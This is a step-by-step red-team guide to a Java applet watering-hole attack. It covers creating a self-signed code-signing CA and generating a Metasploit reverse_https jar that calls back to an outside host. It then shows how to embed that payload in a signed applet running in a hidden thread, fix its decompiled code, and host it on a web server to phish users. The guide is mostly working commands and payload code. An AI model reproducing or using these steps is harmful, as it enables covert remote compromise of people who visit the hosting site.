<!---------------------------------------------------------------------------------
Copyright: (c) BLS OPS LLC.
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, version 3.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
--------------------------------------------------------------------------------->
# Java Applet Watering Hole Attack

**References**

* You can read more about this process [here](https://stackoverflow.com/questions/9428335/make-your-own-certificate-for-signing-files).

**Requirements**

* openssl installed

#### CA Self Signed Certificate

In order to Phish using Java, you need a code signing certificate. These can be purchased at variety of vendors.

1. Navigate to the local openssl directory
```
1. /usr/lib/ssl/misc/
```
1. Copy `openssl.cnf` #@TODO - step needs confirmation/clarification
1. Execute the `CA.sh` bash script to create your initial CA authority
```
CA.sh -newca
```
1. Change directory to the new folder, demoCA
```
cd demoCA
```
1. Copy the openssl.cnf from the /usr/lib/ssl/ directory and modify usage for the code signing:
```
cp /usr/lib/ssl/openssl.conf .
```
1. Open openssl.conf and modify the following fields to contain the following values

    * There are multiple portions of the configuration file that can be assigned extended Key Usage.
    * There is a section labeled [ usr_cert], modify that section to add code signing to the user cert.
    * Note that a code signing certificate can only be used for code signing
    * keyUsage = digitalSignature
    * extendedKeyUsage = codeSigning

1. Modify the dir to operate from in the configuration file to the local directory (still within the `openssl.conf`). `[ CA_default ]`
  * From `dir = ./demoCA` to `dir = ./`.
1. Create the user request based on the configuration you modified
```
openssl req -new -keyout user.key -out user.req -config <openssl.conf>
```
1. Sign the certificate by the CA
```
openssl ca -policy policy_anything -config <openssl.conf> -out user.pem -infiles user.req
```
1. Export the certificate in pk12 format.
```
openssl pkcs12 -export -in user.pem -inkey user.key -out user.p12 -name <user> -caname <your_ca_name> -chain -CAfile ./cacert.pem
```
1. Convert the CA certificate into pk12 format:
```
openssl pkcs12 -export -out root_cert.pfx -inkey ./private/cakey.pem -in cacert.pem -certfile cacert.pem
```
1. Convert the user code signing certificate into java jks storage
1. *** Note, make sure you remember the alias used when creating the user certificate. You can view it by executing the following:
```
keytool -v -list -storetype pkcs12 -keystore user.p12
```
1. Convert the certificate to `jks`:
```
keytool -importkeystore -srckeystore user.p12 -srcstoretype pkcs12 -srcalias <user> -destkeystore user.jks -deststoretype jks -deststorepass password -destalias <user>
```
1. Copy the `user.p12` and `root_cert.pfx` to the systems that will be utilizing the Java applet.
1. Copy the `user.jks` to the system that will be signing the applet.

#### Exporting Metasploit Jar for Reverse HTTPS Call Back

1. Using msfvenom, use the following to create a jar file for reverse_https call back:
```
msfvenom -p java/meterpreter/reverse_https -f raw LHOST=172.16.4.23 LPORT=443 > java_rhttps.jar
```
1. Decompile the jar file using [jd-gui](http://jd.benow.ca/).
1. Once you decompile the `jar`, save the `.java` files.

# Creating Signed Java Applet
## Create new projects in Netbeans

1. Make sure you are using the latest JDK and Netbeans IDE.
1. Create a new project within Netbeans. Once you've shelled out your program, add in the following code to create a thread from your main program:
```java
        Thread athread = new Thread(new Runnable(){
           @Override
           public void run(){
               try{
                Payload.main(new String[0]);
                //Class0.main(new String[0]);
               }
               catch(Exception e){}
           }
        });
        athread.start();
```
1. You need to run the java from an applet context. Create a new java class and fill it with this code:
```java
package newProject;

import java.applet.Applet;

public class webApplet  extends Applet{
        public void init() {
            newProject.mainJavaClass.main(null);
    }
}
```

## Importing Metasploit Java Code into Applet

1. Create a new java package within your Java program (e.g. `CNDSP`).
1. Drop in the following files into your Java package you just created: `Payload.java`, `PayloadTrustManager.java`
1. Drop in the `Metasploit.dat` file into the **Default Package** of your java program.
1. You will need to update the `Payload.java` program with the errors that the IDE cannot solve. When you export the jar file to `.java` files, they have generic **Objects** throughout the program which requires you to cast the objects as certain types.

### Errors you will need to fix
```java
//Line 55
File localObject1 = new File(localFile1.getAbsolutePath() + ".dir");
//Line 56
((File)localObject1).mkdir();
//Line 93 - 100
      File[] localObject6a = new File[] { (File)localObject3, ((File)localObject3).getParentFile(), (File)localObject2, (File)localFile3 };
      for (int k = 0; k < localObject6a.length; k++) {
        for (m = 0; (m < 10) && (!localObject6a[k].delete()); m++)
        {
          localObject6a[k].deleteOnExit();
          Thread.sleep(100L);
        }
      }
//Line 114
Runtime.getRuntime().exec(new String[] { "chmod", "+x", (String)localObject1 }).waitFor();
//Line 122
Runtime.getRuntime().exec(new String[] { (String)localObject1 });
//Line 175 - 177
        Object[] localObject6b = (Object[])Class.forName("saic.AESEncryption").getMethod("wrapStreams", new Class[] { InputStream.class, OutputStream.class, String.class }).invoke(null, new Object[] { localObject3, localObject4, localObject5 });
        localObject3 = (InputStream)localObject6b[0];
        localObject4 = (OutputStream)localObject6b[1];
//Line 277
String localObject = localStringTokenizer.nextToken();
```

Modifying these lines of code will fix any errors within the Metasploit Payload.

## Setting up the JKS Signing

1. Right Click your project and goto "Properties"
1. Then goto Application->Web Start
1. Click "Enable Web Start" Checkbox
1. Change Codebase to "No Codebase"
1. Under Signing, click "Customize"
1. Select "Sign by a specified key"
1. Find the jks file under Keystore Path
1. Type in your keystore password
1. Type in your Key Alias name
1. Type in your Keypassword
1. For Mixed Code, it should be set to "Enable Software Protections"

## Compiling your Java Applet

At this point you should compile and run your Java program from Netbeans. You should get your normal Java Program running along with Metasploit running.

From msfconsole:
```
$ use exploit/multi/handler
$ set payload java/meterpreter/reverse_https
$ set lhost <IP Address>
$ set lport 443
$ set exitonsession false
$ exploit -j -z
```

You should get a meterpreter session and your java program should execute normally. You can even close your java program, and still maintain a meterpreter session.

### Web Applet Compiling

Now to get it working for web applet. After adding the metasploit codebase to the project, fixing the errors, and testing it, we need to deploy it to the web server.

1. Compile the latest build for your project and goto the dist directory. Copy all the files there. Should be:

    * launch.html
    * launch.jnlp
    * newProject.jar
    * README.TXT

1. Copy these files to your `apache2/nginix` server.
1. For Apache2, copy these files under `/var/www/html`. Then create/modify your `index.html` file with the following content:
```html
<applet id="newProject"
        width="400"
        height="800"
        codebase="http://192.168.1.5"
        archive="newProject.jar"
        code="newProject.webApplet">
</applet>
```
1. After all of this is setup, you can now phish users with a signed Java Applet. Make sure that the certificate that was used in the signing is trusted by the users (By previous exploitation and deploying your own root CA, or by using a trusted vendor of code signing).

Troubleshooting Reference: [Clear out the java cache](https://www.java.com/en/download/help/plugin_cache.xml)